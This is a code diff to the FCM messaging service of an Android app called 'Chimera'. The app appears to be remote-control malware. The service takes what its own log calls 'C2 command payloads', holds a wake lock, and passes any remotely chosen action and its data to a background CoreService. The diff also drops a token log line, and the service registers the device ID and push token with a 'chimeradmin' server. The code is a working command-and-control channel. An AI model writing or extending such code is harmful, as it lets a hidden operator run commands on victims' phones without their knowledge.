@@ -1,6 +1,8 @@
 package com.chimera;
 
+import android.content.Context;
 import android.content.Intent;
+import android.os.PowerManager;
 import android.provider.Settings;
 import android.util.Log;
 import androidx.annotation.NonNull;
@@ -19,35 +21,43 @@ public class FCMService extends FirebaseMessagingService {
 
     private static final String TAG = "FCMService";
     private static final String NETLIFY_REGISTER_URL = "https://chimeradmin.netlify.app/.netlify/functions/register-device";
+    private static final String WAKELOCK_TAG = "Chimera:WakeLock";
 
     @Override
     public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
-        if (remoteMessage.getData().isEmpty()) return;
-
-        Map<String, String> data = remoteMessage.getData();
-        Log.d(TAG, "C2 command payload received: " + data);
-        String action = data.get("action");
-        if (action == null || action.isEmpty()) return;
-
-        // Create an Intent targeting our new CommandReceiver
-        Intent commandIntent = new Intent();
-        commandIntent.setPackage(getPackageName()); // Security: ensure only our app can receive this
-        commandIntent.setAction("com.chimera.action." + action.toUpperCase()); // The action CoreService expects
-        commandIntent.setClass(this, CommandReceiver.class); // Target the receiver
-
-        // Pass all data from FCM as extras in the intent
-        for (Map.Entry<String, String> entry : data.entrySet()) {
-            commandIntent.putExtra(entry.getKey(), entry.getValue());
-        }
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, WAKELOCK_TAG);
         
-        // Use sendBroadcast - this is the robust way to wake the app
-        sendBroadcast(commandIntent);
+        try {
+            wakeLock.acquire(10000L /* 10 seconds timeout */);
+            Log.d(TAG, "WakeLock acquired.");
+
+            if (remoteMessage.getData().isEmpty()) return;
+
+            Map<String, String> data = remoteMessage.getData();
+            Log.d(TAG, "C2 command payload received: " + data);
+            String action = data.get("action");
+            if (action == null || action.isEmpty()) return;
+
+            Intent commandIntent = new Intent(this, CoreService.class);
+            commandIntent.setAction("com.chimera.action." + action.toUpperCase());
+            for (Map.Entry<String, String> entry : data.entrySet()) {
+                commandIntent.putExtra(entry.getKey(), entry.getValue());
+            }
+            startService(commandIntent);
+            Log.d(TAG, "CoreService started with command: " + action);
+
+        } finally {
+            if (wakeLock.isHeld()) {
+                wakeLock.release();
+                Log.d(TAG, "WakeLock released.");
+            }
+        }
     }
 
     @Override
     public void onNewToken(@NonNull String token) {
         super.onNewToken(token);
-        Log.i(TAG, "FCM token refreshed: " + token);
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         if (deviceId != null) {
             registerNewTokenWithServer(deviceId, token);
